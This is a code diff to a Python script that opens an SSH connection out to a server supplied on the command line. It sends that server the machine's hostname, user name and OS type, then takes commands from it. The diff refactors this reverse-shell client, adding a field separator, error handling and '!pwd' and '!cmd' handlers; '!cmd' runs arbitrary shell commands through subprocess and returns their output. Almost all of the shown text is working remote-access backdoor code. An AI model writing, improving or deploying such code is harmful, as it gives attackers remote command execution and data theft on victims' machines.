@@ -22,6 +22,7 @@ def main():
     port = args.port #Server port
     username = args.user #Server username
     password = args.password #Server password
+    SEPARATOR = "<&sep>"
 
     try:
         client = paramiko.SSHClient()
@@ -31,12 +32,12 @@ def main():
         host = socket.gethostname()
         user = getpass.getuser()
         type = os.name
-    except Exception as ex:
+    except Exception:
         print("[!] Unable to connect to server. Use -h for help.")
         sys.exit()
 
     if session.active:
-        session.sendall(f"{host},{user},{type}")
+        session.sendall(f"{host}{SEPARATOR}{user}{SEPARATOR}{type}")
         print(session.recv(1024).decode())
         while True:
             try:
@@ -46,20 +47,26 @@ def main():
                     sys.exit()
                 elif head == "!cd":
                     path = " ".join(incoming.split(" ")[1:])
-                    os.chdir(path)
-                    CWD = os.getcwd()
-                    session.sendall(f"Current directory: {CWD}\n")
-                elif head == "!c":
+                    try:
+                        os.chdir(path)
+                    except FileNotFoundError as ex:
+                        output = str(ex)
+                    else:
+                        output = ""
+                elif head == "!pwd":
+                    output = os.getcwd()
+                elif head == "!cmd":
                     command = " ".join(incoming.split(" ")[1:])
                     output = subprocess.getoutput(command)
-                    if (len(output) == 0):
-                        session.sendall("[*] Command executed. No shell output.\n")
-                    else:
-                        session.sendall(output + "\n")
                 else:
-                    session.sendall("[!] Invalid.\n")
+                    output = "[!] Invalid"
+                # If a null output is sent, the connection seems to break
+                if (len(output) == 0):
+                    session.sendall(" ")
+                else:
+                    session.sendall(output)
             except Exception as ex:
-                session.sendall("[!] " + str(ex) + "\n")
+                session.sendall("[!] " + str(ex))
 
 if __name__ == "__main__":
     main()
